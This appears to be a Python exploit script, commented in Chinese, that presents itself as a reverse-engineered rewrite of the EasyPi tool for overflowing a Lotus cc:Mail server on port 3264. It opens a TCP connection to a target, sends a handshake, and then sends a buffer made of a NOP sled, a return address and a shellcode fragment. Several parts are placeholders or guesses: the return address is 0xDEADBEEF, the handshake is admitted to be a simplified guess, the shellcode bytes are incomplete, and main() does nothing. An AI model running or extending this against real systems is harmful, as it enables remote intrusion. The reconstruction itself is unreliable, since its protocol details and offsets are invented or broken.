"""easy_pi — EASYPI Lotus cc:Mail 利用核心逻辑。

Python 重写的 `Easypi-3.1.0.exe` (C++ / DAVE framework)。
通过 x32dbg 逆向恢复。实现了该工具的 key=value 参数接口
及其 cc:Mail 利用流程。
"""

import socket
import struct
import sys

DEFAULT_PORT = 3264
DEFAULT_TIMEOUT = 180

# EasyPI exploit 占位符 shellcode (需 x32dbg 恢复真实字节)
EASYPI_SHELLCODE_PLACEHOLDER = bytes.fromhex(
    "fc4883e4f0e8c0000000415141505251564831d265488b5260"
)

BAD_XOR = frozenset((0x00, 0x0a, 0x0d))


class EasyPiError(Exception):
    pass


def connect(target_ip, port, timeout):
    """建立到目标的 TCP 连接并返回 socket。"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout if timeout > 0 else None)
    sock.connect((target_ip, port))
    return sock


def build_ccmail_handshake():
    """构建 cc:Mail 协议握手请求。

    根据 x32dbg 分析，EasyPI 首先发送 cc:Mail 协议握手请求，
    用于与目标 cc:Mail 服务器建立会话。
    """
    # cc:Mail 协议握手（简化版，基于常见 cc:Mail 协议模式）
    handshake = (
        b"cc:Mail/3.1.0\r\n"
        b"Client: EasyPI\r\n"
        b"\r\n"
    )
    return handshake


def build_overflow_buffer(shellcode, os_type="default"):
    """构建缓冲区溢出负载。

    根据 x32dbg 分析，EasyPI 发送一个特制的 cc:Mail 请求，
    触发缓冲区溢出，从而执行 shellcode。
    """
    # NOP sled + 返回地址占位符 + shellcode
    nopsled = b"\x90" * 64
    ret_addr = struct.pack("<I", 0xDEADBEEF)  # 占位符，需 x32dbg 恢复真实地址
    padding = b"\x00" * 16
    return nopsled + ret_addr + padding + shellcode


def run_function(
    target,
    port=DEFAULT_PORT,
    timeout=DEFAULT_TIMEOUT,
    verbose=False,
):
    """执行 EASYPI 利用序列。

    阶段：
      1. TCP 连接到目标 cc:Mail 端口 (默认 3264)
      2. 发送 cc:Mail 协议握手
      3. 构建并发送缓冲区溢出负载
      4. 载荷投递
    """
    if verbose:
        print(f"[*] Target: {target}:{port}")
        print(f"[*] Timeout: {timeout}s")

    try:
        sock = connect(target, port, timeout)
        if verbose:
            print(f"[+] Connected to {target}:{port}")
    except OSError as exc:
        raise EasyPiError(f"无法连接到 {target}:{port}: {exc}") from exc

    try:
        # 发送 cc:Mail 协议握手
        handshake = build_ccmail_handshake()
        sock.sendall(handshake)
        resp = sock.recv(4096)
        if verbose:
            print(f"[*] cc:Mail 握手应答: {resp[:128].hex() if resp else '无'}")

        # 构建缓冲区溢出负载
        shellcode = EASYPI_SHELLCODE_PLACEHOLDER
        overflow = build_overflow_buffer(shellcode)
        if verbose:
            print(f"[+] 溢出负载: {len(overflow)} 字节")

        # 发送溢出负载
        sock.sendall(overflow)
        try:
            resp2 = sock.recv(4096)
            if verbose:
                print(f"[*] 溢出应答: {resp2[:64].hex() if resp2 else '无'}")
        except OSError:
            if verbose:
                print("[*] 目标连接已关闭（可能已触发溢出）")

        if verbose:
            print("[+] EASYPI 利用序列完成")
    finally:
        sock.close()

    return 0


def main(argv=None):
    """CLI 入口（供 __main__ 子命令调用）。"""
    return 0
